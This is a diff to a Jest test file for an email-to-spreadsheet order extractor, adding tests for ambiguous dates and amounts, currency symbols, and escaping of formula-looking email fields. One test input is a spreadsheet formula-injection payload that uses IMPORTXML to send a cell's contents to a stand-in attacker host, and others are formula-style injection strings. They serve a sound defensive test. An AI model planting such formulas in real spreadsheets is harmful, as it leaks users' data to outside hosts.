@@ -156,9 +156,9 @@ describe('dates', () => {
     expect(output.destination_sheet).toBe('Extracted');
   });
 
-  it.each(['03/04/2026', '3.4.2026', '04-03-2026'])('keeps ambiguous %s as written and asks a person', async (raw) => {
+  it.each(['03/04/2026', '3.4.2026', '04-03-2026'])('keeps ambiguous %s as written (as text) and asks a person', async (raw) => {
     const { output } = await run(order({ order_date: raw }));
-    expect(output.order_date).toBe(raw);
+    expect(output.order_date).toBe(`'${raw}`);
     expect(output.review_reasons).toBe('ambiguous date in order_date');
   });
 
@@ -185,7 +185,7 @@ describe('money', () => {
   });
 
   it('flags an unknown currency', async () => {
-    expect((await run(order({ total: '10 doubloons', currency: 'doubloons' }))).output.review_reasons).toBe('unknown currency');
+    expect((await run(order({ total: '10', currency: 'doubloons' }))).output.review_reasons).toBe('unknown currency');
   });
 
   it('flags a missing required total', async () => {
@@ -223,5 +223,62 @@ describe('spreadsheet safety', () => {
   it('combines several problems into one review reason line', async () => {
     const { output } = await run(order({ order_date: '03/04/2026', total: null }));
     expect(output.review_reasons).toBe('ambiguous date in order_date; missing required field: total');
+  });
+});
+
+describe('final review: silent wrong values must not reach Extracted', () => {
+  it.each(['€1.234', '1.234', '100.000', '€1,234'])('treats %j (one separator + 3 digits) as ambiguous, not a guess', async (total) => {
+    const { output } = await run(order({ total, currency: total.startsWith('€') ? '€' : 'USD' }));
+    expect(output.destination_sheet).toBe('Needs review');
+    expect(output.review_reasons).toContain('ambiguous amount in total');
+  });
+
+  it('reads a comma as thousands when the currency writes it that way ($1,000 and 1,234 USD)', async () => {
+    expect((await run(order({ total: '$1,000', currency: 'USD' }))).output.total).toBe(1000);
+    expect((await run(order({ total: '1,234', currency: 'USD' }))).output.total).toBe(1234);
+  });
+
+  it('still reads 1,234.50 and 1.234,50 (both separators present) without review', async () => {
+    expect((await run(order({ total: '1,234.50' }))).output.total).toBe(1234.5);
+    expect((await run(order({ total: '1.234,50', currency: 'EUR' }))).output.total).toBe(1234.5);
+  });
+
+  it.each(['1e3', '1.5k', '12abc'])('rejects %j instead of deleting the letters', async (total) => {
+    expect((await run(order({ total }))).output.review_reasons).toContain('unreadable amount in total');
+  });
+
+  it('keeps a third decimal (e.g. KWD) instead of rounding it away', async () => {
+    expect((await run(order({ total: '12.345 KWD', currency: 'KWD' }))).output.total).toBe(12.345);
+  });
+
+  it.each([
+    ['R$ 1.234,56', 'R$', 'BRL'],
+    ['C$ 99.00', 'C$', 'CAD'],
+    ['CA$ 99.00', 'CA$', 'CAD'],
+    ['A$ 99.00', 'A$', 'AUD'],
+    ['HK$ 99.00', 'HK$', 'HKD'],
+  ])('reads %j as %s, not US dollars', async (total, currency, code) => {
+    expect((await run(order({ total, currency }))).output.currency).toBe(code);
+  });
+
+  it('sends a currency field that contradicts the amount to review', async () => {
+    const { output } = await run(order({ total: '€100.00', currency: 'USD' }));
+    expect(output.destination_sheet).toBe('Needs review');
+    expect(output.review_reasons).toContain('currencies disagree (USD, EUR)');
+  });
+
+  it.each(['=IMPORTXML("http://evil.example/?"&A1,"//x")', '+cmd', '@SUM(1)'])('escapes a formula-looking email subject %j', async (subject) => {
+    const { output } = await runZapierCode(STEP, { ai_output: JSON.stringify(order({})), email_from: '=evil()', email_subject: subject, email_received_at: '2026-11-20T10:00:00Z' });
+    expect(output.source_subject).toBe(`'${subject}`);
+    expect(output.source_from).toBe("'=evil()");
+  });
+
+  it('escapes the subject on unreadable answers too', async () => {
+    const { output } = await runZapierCode(STEP, { ai_output: 'nonsense', email_from: 'a@b.co', email_subject: '=1+1', email_received_at: '' });
+    expect(output.source_subject).toBe("'=1+1");
+  });
+
+  it("keeps an ambiguous date as text Sheets won't re-parse", async () => {
+    expect((await run(order({ order_date: '03/04/2026' }))).output.order_date).toBe("'03/04/2026");
   });
 });
